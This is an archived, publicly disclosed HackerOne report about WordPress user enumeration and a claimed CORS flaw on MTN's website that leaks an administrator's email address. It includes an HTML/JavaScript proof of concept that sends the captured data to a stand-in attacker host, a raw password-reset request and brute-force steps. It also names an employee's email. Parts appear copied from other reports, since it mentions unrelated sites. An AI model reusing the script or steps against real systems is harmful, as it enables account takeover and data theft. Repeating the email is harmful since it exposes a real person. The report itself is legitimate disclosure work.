---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/privilege-escalation
  - env/web
  - vuln/xss
  - vuln/info-disclosure
  - vuln/cors-misconfig
  - vuln/misconfiguration
  - impact/account-takeover
  - impact/sensitive-data
  - trigger/auth-required
  - trigger/victim-interaction
  - trigger/cors-origin
  - trigger/brute-force
substate: "resolved"
weakness: "Privilege Escalation"
enriched: true
body: true
date: 2025-02-22
submitted: 2024-04-06T22:17:41.520Z
bounty_usd: null
votes: 82
cve: []
program: "[[programs/mtn_group|MTN Group]]"
reporter: "h0w"
source: "https://hackerone.com/reports/2450685"
title: "Unauthorized access to PII leads to Administrator account Takeover"
---
# Unauthorized access to PII leads to Administrator account Takeover

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 82 | **Program:** MTN Group | **Disclosed:** 2025-02-22

- Report: [https://hackerone.com/reports/2450685](https://hackerone.com/reports/2450685)
- CWE: Privilege Escalation
- Submitted: 2024-04-06T22:17:41.520Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
This vulnerability is present in the `wp-json/wp/v2/users/15` file located in the wordpress directory endpoints. This flaw arises from insufficient restrictions placed on the list of post authors, which can be exploited by remote attackers to obtain sensitive information through wp/v2/users/15 requests attackers can obtain sensitive information in the form of email addresses (PII Leaks) and will be used in `wp-login` to send forget password or brute-force password requests.

**Descriptions:**
An cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request. If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. This bug could be used to steal users information or force the user to execute unwanted actions. As long that a legit and logged in user is lure to access a attacker controlled HTML page CORS misconfiguration is found on vanillaforums.com as `Access-Control-Allow-Credentials: true`.

**Platform(s) Affected: [website]**
https://www.mtn.com/wp-json/wp/v2/users/15

## Steps To Reproduce:
  1. Navigate visit hostname or directory on https:\/\/www.mtn.com\/wp-json\/wp\/v2\/users\/9
  1. Intercept request to `burp-suite` and you will see unauthenticated APIs `administrator_login` email address exposed

{F3171358}

  3. copy this scripts and save file as `.html` and open in our browsers 

```html
<!DOCTYPE html>
<html>
<body>
<center>
<h3>Steal administrator PII data!</h3>
<html>
<body>
<button type='button' onclick='cors()'>Exploit</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from niche.co about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://burpcollaborator-intruder-evil.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://www.mtn.com/wp-json/wp/v2/users/15", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```
{F3171366}


## Supporting Material/References:
  * It's possible to remove this access for anyone by change the source code where when someone request the Rest API and the server send a 404 (Not Found) message for the user who made the request.
  * It's also possible to create a rewrite rule on `.htaccess` (if the webserver it's Apache) to redirect any request that contain rest_route (eg.: "^.rest_route=/wp-json/wp/v2/users/15") to a Not Found (404) or a Default Page.

## Impact

1. Attacker get sensitive information PII Leaks (email adress)
 1. Attacker can brute-force the password use the valid administrator login
 1. CORS Misconfiguration, could lead to disclosure of sensitive information
 * Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.
 * This website using Wordpress , so developer forget to enable authenticator in the APIs that can view information of admin user. By access to this link, attacker can get `username` and `email_address` and other information of user admin.

## Timeline

- **Report Filed**
- **2024-04-06** @h0w: ## Additional Proof On Concept:
When the attacker has obtained credentials that are exposed through https://www.mtn.com/wp-json/wp/v2/users/15, namely the sensitive of PII Leaks email address `hlulani.Hlayisi@mtn.com` then for the next step the attacker tries to use password bruteforce through the administrator login access at https://www.mtn.com/wp-admin
 
 * Navigate visit PII Leaks on https://www.mtn.com/wp-json/wp/v2/users/15 `copy` the email address
 * Next steps visit administrator login dashboard on https://www.mtn.com/wp-login.php?checkemail=confirm
 * PUT email address `hlulani.Hlayisi@mtn.com` on forget password page or login administrator
 * Submit HTTP Request you can see the page server accepts that the email is a `valid` account and server sends a notification to the email for forget_password.

Here's the HTTP Parameter request that the issue:
```
POST /wp-login.php?action=lostpassword HTTP/2
Host: www.mtn.com
Content-Length: 76
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
Origin: https://www.mtn.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.mtn.com/wp-login.php?action=lostpassword
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

user_login=hlulani.Hlayisi%40mtn.com&redirect_to=&wp-submit=Get+New+Password
```
{F3171375}

{F3171376}
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
